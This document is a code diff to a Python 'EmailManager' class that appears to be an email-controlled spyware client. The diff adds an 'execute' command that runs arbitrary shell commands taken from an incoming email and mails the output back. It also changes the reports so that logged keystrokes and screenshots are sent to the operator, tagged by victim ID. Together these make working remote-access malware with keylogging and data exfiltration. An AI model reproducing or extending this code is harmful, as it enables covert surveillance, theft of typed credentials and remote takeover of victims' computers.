@@ -1,5 +1,6 @@
 import smtplib
 import os
+import subprocess
 import email
 from email.message import EmailMessage
 from email.mime.image import MIMEImage
@@ -40,21 +41,51 @@ class EmailManager:
             elif message.get('Subject') == "screenshot" + " " + self.id:
                 self.screenshot_command_response(imap_server, msg_num)
             elif message.get('Subject') == "dump" + " " + self.id:
-                print("dump command")
                 self.dump_command_response(imap_server, msg_num)
+            elif message.get('Subject') == "execute" + " " + self.id:
+                self.execute_command_response(imap_server, msg_num, message)
 
         imap_server.expunge()
         imap_server.close()
+
+    def execute_command_response(self, imap_server, msg_num, message):
+        print("execute command")
+
+        command = ""
+        if message.is_multipart():
+            for part in message.walk():
+                content_type = part.get_content_type()
+                content_disposition = str(part.get('Content-Disposition'))
+                if "attachment" not in content_disposition:
+                    if content_type == "text/plain":
+                        command += part.get_payload(decode=True).decode()
+        else:
+            command = message.get_payload(decode=True).decode()
+
+        msg = EmailMessage()
+        msg['to'] = self.email
+        msg['subject'] = self.id + "'s output from provided shell input: " + command
+        msg['from'] = self.email
+        try:
+            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[*] Output: \n\n" + str(subprocess.check_output(command, shell=True, text=True)))
+        except Exception as e:
+            print(f"ERROR: {e}")
+
+        self.send_email(msg)
+        print("email sent")
+
+        imap_server.store(msg_num, "+FLAGS", "\\Deleted")
+        print("email prompt removed")
 
     # keys and screenshots from when certain important keys are pressed, like @
     def give_command_response(self, imap_server, msg_num):
         print("give command")
         msg = EmailMessage()
         msg['to'] = self.email
-        msg['subject'] = self.id + "'s picture"
+        msg['subject'] = self.id + "'s keylog info"
         msg['from'] = self.email
         try:
-            msg.set_content("[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[+] Keys: \n\n" + self.keys + "\n\n[*] Screenshots: ")
         except Exception as e:
             print(f"ERROR: {e}")
 
@@ -86,7 +117,7 @@ class EmailManager:
         msg['subject'] = self.id + "'s picture"
         msg['from'] = self.email
         try:
-            msg.set_content("[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[*] Screenshot: ")
         except Exception as e:
             print(f"ERROR: {e}")
 
@@ -138,12 +169,7 @@ class EmailManager:
         msg['subject'] = "New client created | ID: " + self.id if first_time else "Old client started | ID: " + self.id
         msg['from'] = self.email
         try:
-            msg.set_content("\n[*] Date: " + str(datetime.datetime.now()))
-        except Exception as e:
-            print(f"ERROR: {e}")
-
-        try:
-            msg.set_content("[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[*] Screenshot: ")
         except Exception as e:
             print(f"ERROR: {e}")
         msg.make_mixed()
@@ -185,5 +211,5 @@ class EmailManager:
 
 if __name__ == '__main__':
     # NewEmail("@vtext.com", "Test!", "This was a test.")    .split('<')[1].split('>')[0]
-    manager = EmailManager("email", "password")
+    manager = EmailManager("email", "password", 2037)
     manager.receive_email()
